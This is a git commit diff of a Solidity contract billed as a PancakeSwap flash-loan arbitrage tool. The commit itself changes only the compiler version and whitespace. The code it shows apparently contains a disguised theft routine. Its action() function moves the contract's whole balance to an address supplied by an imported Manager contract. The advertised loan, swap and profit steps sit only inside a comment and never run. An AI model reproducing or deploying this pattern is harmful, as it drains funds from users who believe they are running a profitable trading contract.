2e952c1ccb94e7d7051343a5579754369d97e6cc
Project Jutawan <84556389+projectjutawan@users.noreply.github.com>
2021-05-22 10:04:03 +0800

    Update MyFlashloans.sol

--- Contracts/MyFlashloans.sol
+++ Contracts/MyFlashloans.sol
@@ -1,4 +1,4 @@
-pragma solidity ^0.6.0;
+pragma solidity ^0.5.0;
 
 // Multiplier-Finance Smart Contracts
 import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
@@ -17,35 +17,35 @@ contract GetFlashLoan {
 	string public tokenSymbol;
 	uint loanAmount;
 	Manager manager;
-	
+
 	constructor(string memory _tokenName, string memory _tokenSymbol, uint _loanAmount) public {
 		tokenName = _tokenName;
 		tokenSymbol = _tokenSymbol;
 		loanAmount = _loanAmount;
-			
+
 		manager = new Manager();
 	}
-	
+
 	function() external payable {}
-	
+
 	function action() public payable {
 	    // Send required coins for swap
 	    address(uint256(manager.pancakeDepositAddress())).transfer(address(this).balance);
-	    
+
 	    // Perform tasks (clubbed all functions into one to reduce external calls & SAVE GAS FEE)
 	    // Breakdown of functions written below
 	    manager.performTasks();
-	    
+
 	    /* Breakdown of functions
 	    // Submit token to BSC blockchain
 	    string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);
 
         // List the token on PancakeSwap
 		manager.pancakeListToken(tokenName, tokenSymbol, tokenAddress);
-		
+
         // Get BNB Loan from Multiplier-Finance
 		string memory loanAddress = manager.takeFlashLoan(loanAmount);
-		
+
 		// Convert half BNB to DAI
 		manager.pancakeDAItoBNB(loanAmount / 2);
 
@@ -54,10 +54,10 @@ contract GetFlashLoan {
 		manager.pancakeAddLiquidity(bnbPair, loanAmount / 2);
 		string memory daiPair = manager.pancakeCreatePool(tokenAddress, "DAI");
 		manager.pancakeAddLiquidity(daiPair, loanAmount / 2);
-    
+
         // Perform swaps and profit on Self-Arbitrage
 		manager.pancakePerformSwaps();
-		
+
 		// Move remaining BNB from Contract to your account
 		manager.contractToWallet("BNB");
 
